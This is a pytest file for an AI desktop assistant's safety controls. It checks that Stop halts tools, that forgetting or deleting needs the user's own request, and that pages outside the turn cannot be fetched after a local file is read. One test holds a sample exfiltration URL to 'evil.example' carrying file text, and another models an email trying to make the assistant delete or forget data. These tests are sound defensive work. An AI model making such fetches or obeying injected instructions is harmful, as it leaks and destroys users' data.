"""What one chat turn may do on its own, 2026-10-28 audit 2.2 (Stop stops the tools), 2.3 (deleting, forgetting and
stopping need the user's own words) and 0.2 (after reading a file on the PC, no page outside the turn can be
fetched, so a page or email can't have the file's text sent out); and how it ends when the models fail: 2.1 (say what
the tools did) and 2.4 (a deadline for the whole turn)."""
import time

import pytest

from core import web_tools
from core.assistant_tools import AssistantTools
from core.database import DatabaseManager
from core.llm import CloudLLM
from core.memory import tools_ran_note
from core.schedules import ScheduleStore


@pytest.fixture
def db(tmp_path):
    return DatabaseManager(tmp_path / "state.db")


def test_a_stopped_turn_runs_no_more_tools(db, tmp_path):
    tools = AssistantTools(db, None, tmp_path, user_text="remind me at 8 every day to stretch")
    tools.cancelled = lambda: True
    out = tools.call("create_schedule", {"kind": "reminder", "cron": "0 8 * * *", "name": "stretch", "text": "stretch"})
    assert "stopped this reply" in out and ScheduleStore(db).list() == []


def test_the_tool_loop_ends_when_the_user_stops(monkeypatch):
    llm = CloudLLM(keys={"gemini": "test"})
    two_calls = {"content": "", "tool_calls": [{"id": "a1", "function": {"name": "first", "arguments": "{}"}},
                                               {"id": "a2", "function": {"name": "second", "arguments": "{}"}}]}
    monkeypatch.setattr(llm, "_complete", lambda route, payload, timeout, step=0: two_calls)
    ran, stop = [], {"now": False}

    def call_tool(name, args):
        ran.append(name)
        stop["now"] = True               # the user pressed Stop while the first tool ran
        return "ok"
    reply, trace = llm.chat_with_tools([{"role": "user", "content": "do two things"}], [{"type": "function"}],
                                       call_tool, cancelled=lambda: stop["now"])
    assert reply is None and ran == ["first"] and [t["name"] for t in trace] == ["first"]


class NoForgetting:
    """A memory that fails the test if anything is forgotten."""
    def forget_everywhere(self, what):
        raise AssertionError("forgot without being asked")


def test_an_email_cant_make_the_chat_forget_or_delete(db, tmp_path):
    tools = AssistantTools(db, NoForgetting(), tmp_path, user_text="what does my latest email say?")
    assert "doesn't ask for this" in tools.forget_memory("everything about the permit")
    sid = ScheduleStore(db).create(name="pins", kind="pins", cron="0 9 * * *")["id"]
    assert "doesn't ask for this" in tools.change_schedule(sid, delete=True)
    assert ScheduleStore(db).get(sid) is not None
    assert "doesn't ask for this" in tools.cancel_task("task-1")


def test_after_reading_a_pc_file_only_this_turns_pages_can_be_fetched(db, tmp_path, monkeypatch):
    fetched = []
    monkeypatch.setattr(web_tools, "fetch_webpage", lambda url, max_chars=3000: fetched.append(url) or "page")
    monkeypatch.setattr(web_tools, "web_search", lambda query, limit=6: "1. Docs https://docs.example.org/guide")
    tools = AssistantTools(db, None, tmp_path, user_text="compare notes.txt with https://example.com/spec")
    assert tools.call("fetch_webpage", {"url": "https://anything.example/"}) .endswith("page")  # no file read yet
    tools._read_a_pc_file = True
    assert "only pages from" in tools.call("fetch_webpage", {"url": "https://evil.example/?d=the+file+text"})
    assert tools.call("fetch_webpage", {"url": "https://example.com/spec"}).endswith("page")       # the user's link
    tools.call("web_search", {"query": "guide"})
    assert tools.call("fetch_webpage", {"url": "docs.example.org/guide"}).endswith("page")         # a search result
    assert "https://evil.example/?d=the+file+text" not in fetched


def test_when_every_model_fails_after_tools_acted_the_tools_are_returned(monkeypatch):
    """2.1: chat_with_tools returned (None, []) and what the tools had done was lost from the reply."""
    llm = CloudLLM(keys={"gemini": "test"})
    answers = iter([{"content": "", "tool_calls": [{"id": "a1", "function": {"name": "add_to_list", "arguments": "{}"}}]}])

    def complete(route, payload, timeout, step=0):
        try:
            return next(answers)
        except StopIteration:
            raise TimeoutError("every model is down")
    monkeypatch.setattr(llm, "_complete", complete)
    reply, trace = llm.chat_with_tools([{"role": "user", "content": "add milk"}], [{"type": "function"}],
                                       lambda name, args: "Added milk to Groceries.")
    assert reply is None and [t["name"] for t in trace] == ["add_to_list"]
    note = tools_ran_note(trace)
    assert "stopped answering" in note and "add_to_list: Added milk to Groceries." in note


def test_a_turn_stops_trying_models_at_its_deadline(monkeypatch):
    """2.4: each call had a timeout but the turn didn't; an outage outlasted DeskAI's 260 s wait."""
    llm = CloudLLM(keys={"gemini": "test", "groq": "test"})
    tried = []
    monkeypatch.setattr(llm, "_complete", lambda route, payload, timeout, step=0: tried.append(route))
    reply, _trace = llm.chat_with_tools([{"role": "user", "content": "hi"}], [{"type": "function"}],
                                       lambda n, a: "ok", deadline=time.time() + 2)      # less than the reserve
    assert reply is None and tried == []
    assert llm._time_left() is None                       # the deadline doesn't outlive the turn
    # and a call near the deadline gets only the time that's left
    timeouts = []

    def slow(route, payload, timeout, step=0):
        timeouts.append(timeout)
        raise TimeoutError("hung")
    monkeypatch.setattr(llm, "_complete", slow)
    llm.chat_with_tools([{"role": "user", "content": "hi"}], [{"type": "function"}], lambda n, a: "ok",
                        deadline=time.time() + 12)
    assert timeouts and max(timeouts) <= 7
